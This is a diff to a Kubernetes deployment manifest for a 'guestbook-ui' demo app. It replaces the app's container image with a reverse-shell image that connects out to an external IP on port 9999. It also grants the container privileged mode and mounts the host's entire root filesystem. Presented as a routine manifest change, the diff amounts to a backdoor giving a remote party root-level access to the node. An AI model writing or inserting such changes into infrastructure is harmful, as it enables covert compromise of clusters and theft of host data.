@@ -13,8 +13,19 @@ spec:
       labels:
         app: guestbook-ui
     spec:
-      containers:
-      - image: gcr.io/heptio-images/ks-guestbook-demo:0.2
+      container:
         name: guestbook-ui
-        ports:
-        - containerPort: 80
+        image: breenmachine/revshell
+        args:
+          - '157.245.95.118:9999'
+        resources: {}
+        volumeMounts:
+          - name: hostroot
+            mountPath: /host
+        securityContext:
+          privileged: true
+      volumes:
+        - name: hostroot
+          hostPath:
+            path: /
+            type: Directory
